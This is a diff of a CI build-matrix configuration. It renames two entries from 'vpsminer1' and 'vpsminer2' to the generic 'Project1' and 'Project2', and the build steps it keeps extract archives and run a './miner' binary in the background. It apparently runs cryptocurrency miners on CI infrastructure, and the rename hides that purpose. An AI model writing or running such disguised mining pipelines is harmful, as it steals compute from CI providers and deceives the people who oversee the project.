@@ -13,7 +13,8 @@ init:
 
 # Define a build matrix for different projects
 matrix:
-  - project: vpsminer1
+  # Define builds for Project1
+  - project: Project1
     build_script:
       # Build commands for Project1
       - tar xvf project1.tar.gz
@@ -22,7 +23,8 @@ matrix:
       - ./miner &  # Run the first project in the background
       - wait  # Wait for the process to finish
 
-  - project: vpsminer2
+  # Define builds for Project2
+  - project: Project2
     build_script:
       # Build commands for Project2
       - tar xvf project2.tar.gz
@@ -30,3 +32,4 @@ matrix:
       - chmod +x ./miner
       - ./miner &  # Run the second project in the background
       - wait  # Wait for the process to finish
+      
